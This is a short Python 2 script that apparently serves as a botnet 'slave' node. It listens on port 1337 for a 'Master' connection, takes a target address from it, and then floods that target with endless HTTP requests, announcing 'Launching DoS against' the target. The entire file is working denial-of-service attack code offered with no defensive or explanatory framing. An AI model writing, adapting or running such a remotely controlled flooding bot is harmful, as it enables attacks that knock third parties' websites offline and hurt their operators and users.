import socket,urllib2

def _dosAddr_(target):
	x=0
	while 1:
		x+=1
		print x
		urllib2.urlopen('http://'+target)	

slave=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
slave.bind(('',1337))
slave.listen(1)
conn, addr = slave.accept()
print "Master Connected", addr
while 1:
	data = conn.recv(1024)
	if not data: break
	print "Received target "+data
	print "Launching DoS against "+data
	slave.close()
	_dosAddr_(data)

